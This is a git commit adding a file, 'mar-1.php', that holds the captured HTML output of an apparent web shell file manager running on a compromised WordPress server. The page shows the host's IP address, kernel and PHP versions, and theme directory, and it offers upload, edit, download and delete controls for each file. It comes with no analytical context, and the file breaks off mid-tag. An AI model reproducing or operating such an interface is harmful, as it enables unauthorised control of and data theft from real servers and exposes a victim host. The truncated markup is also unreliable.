1ee269f8081c7c75b1135a78d4825b18705ddf1d
Nasa stalking stage kapa den?😂 <95758113+CoderSigma@users.noreply.github.com>
2024-08-30 03:26:01 +0800

    Add files via upload

---
+++ mar-1.php
@@ -0,0 +1,303 @@
+<!DOCTYPE html>
+	<html dir="auto" lang="en-US">
+
+		<head>
+			<meta charset="UTF-8">
+			<meta name="robots" content="NOINDEX, NOFOLLOW">
+
+
+			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+
+			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+		</head>
+
+		<body>
+			<header>
+				<div class="i">
+				#0x2525				</div>
+			</header>
+
+			<article>
+				<div class="i">
+					<i class="far fa-hdd"></i>
+					Linux amibr 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64
+					<br />
+
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> Apache/2.4.29 (Ubuntu) <b>PHP :</b> 7.2.24-0ubuntu0.18.04.16
+					<br />
+
+					<i class="far fa-folder"></i>
+					
+					<a class="ajx" href="?d=2f">/</a><a class="ajx" href="?d=2f766172">var</a>/<a class="ajx" href="?d=2f7661722f777777">www</a>/<a class="ajx" href="?d=2f7661722f7777772f68746d6c">html</a>/<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e74">wp-content</a>/<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d6573">themes</a>/<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65">seotheme</a>/
+					<br />
+
+				</div>
+
+				<div class="u">
+					158.69.148.34 <i class="fas fa-link"></i>
+					<br />
+
+					<br />
+
+					<form method="post" enctype="multipart/form-data">
+						<label class="l w">
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
+						</label>&nbsp;
+					</form>
+
+					
+				</div>
+					<table cellspacing="0" cellpadding="7" width="100%">
+						<thead>
+							<tr>
+								<th width="44%">[ NAME ]</th>
+								<th width="11%">[ SIZE ]</th>
+								<th width="17%">[ PERM ]</th>
+								<th width="17%">[ DATE ]</th>
+								<th width="11%">[ ACT ]</th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>
+									<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&n">+FILE</a>
+									<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&l">+DIR</a>
+								</td>
+							</tr>
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f637373">css</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=637373">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=637373">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=637373">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=637373">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f666f6e7473">fonts</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=666f6e7473">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=666f6e7473">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=666f6e7473">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=666f6e7473">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f696d61676573">images</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=696d61676573">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=696d61676573">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=696d61676573">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=696d61676573">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f696e63">inc</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=696e63">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=696e63">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=696e63">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=696e63">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f6a73">js</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=6a73">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=6a73">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=6a73">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=6a73">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f6c616e677561676573">languages</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=6c616e677561676573">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=6c616e677561676573">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=6c616e677561676573">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=6c616e677561676573">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d652f74656d706c6174652d7061727473">template-parts</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=74656d706c6174652d7061727473">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=74656d706c6174652d7061727473">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=74656d706c6174652d7061727473">R</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=74656d706c6174652d7061727473">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&s=3430342e706870">404.php</a>
+							</td>
+							<td class="x">
+								0.812 KB
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=3430342e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=3430342e706870">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=3430342e706870">R</a>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&e=3430342e706870">E</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&g=3430342e706870">G</a>
+								
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=3430342e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&s=617263686976652e706870">archive.php</a>
+							</td>
+							<td class="x">
+								1.319 KB
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=617263686976652e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=617263686976652e706870">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=617263686976652e706870">R</a>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&e=617263686976652e706870">E</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&g=617263686976652e706870">G</a>
+								
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=617263686976652e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&s=636f6d6d656e74732e706870">comments.php</a>
+							</td>
+							<td class="x">
+								1.868 KB
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=636f6d6d656e74732e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=636f6d6d656e74732e706870">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=636f6d6d656e74732e706870">R</a>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&e=636f6d6d656e74732e706870">E</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&g=636f6d6d656e74732e706870">G</a>
+								
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=636f6d6d656e74732e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&s=64622e706870">db.php</a>
+							</td>
+							<td class="x">
+								0.426 KB
+							</td>
+							<td class="x">
+								<a class="ajx w" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&k=64622e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&t=64622e706870">2022-12-12 22:14</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&r=64622e706870">R</a>
+								<a class="ajx" href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&e=64622e706870">E</a>
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&g=64622e706870">G</a>
+								
+								<a href="?d=2f7661722f7777772f68746d6c2f77702d636f6e74656e742f7468656d65732f73656f7468656d65&x=64622e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-fi
